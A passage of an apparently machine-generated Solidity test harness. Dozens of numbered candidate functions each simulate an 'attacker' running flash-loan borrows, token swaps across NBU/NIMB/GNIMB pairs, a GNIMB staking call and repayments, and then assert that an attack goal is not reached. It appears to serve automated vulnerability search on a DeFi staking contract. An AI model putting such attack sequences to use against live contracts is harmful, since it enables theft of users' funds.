        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4386(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4387(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4388(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4389(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4390(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4391(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4392(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4393(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4394(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4395(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4396(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4397(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4398(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4399(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4400(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4401(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4402(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4403(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4404(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4405(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4406(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4407(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4408(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4409(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4410(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4411(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4412(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4413(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4414(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4415(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4416(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4417(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4418(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4419(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4420(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4421(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4422(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4423(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4424(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4425(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4426(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4427(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4428(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4429(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4430(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
